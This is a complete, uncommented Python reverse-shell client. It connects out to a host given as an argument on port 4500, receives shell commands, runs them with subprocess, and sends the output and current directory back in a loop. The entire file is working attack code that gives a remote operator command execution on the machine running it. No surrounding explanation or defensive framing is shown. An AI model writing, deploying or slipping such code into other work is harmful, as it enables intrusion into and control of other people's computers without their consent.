import socket
import os
import subprocess
import sys

SERVER_HOST = sys.argv[1]
SERVER_PORT = 4500
BUFFER_SIZE = 1024 * 128 
SEPARATOR = "<sep>"

sockt_ = socket.socket()
sockt_.connect((SERVER_HOST, SERVER_PORT))

cwd = os.getcwd()
sockt_.send(cwd.encode())

while True:

    command = sockt_.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        break

    if splited_command[0].lower() == "cd":

        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:

            output = str(e)
        else:
            output = ""
    else:    
        output = subprocess.getoutput(command)
    
    cwd = os.getcwd()
    
    message = f"{output}{SEPARATOR}{cwd}"
    sockt_.send(message.encode())

sockt_.close()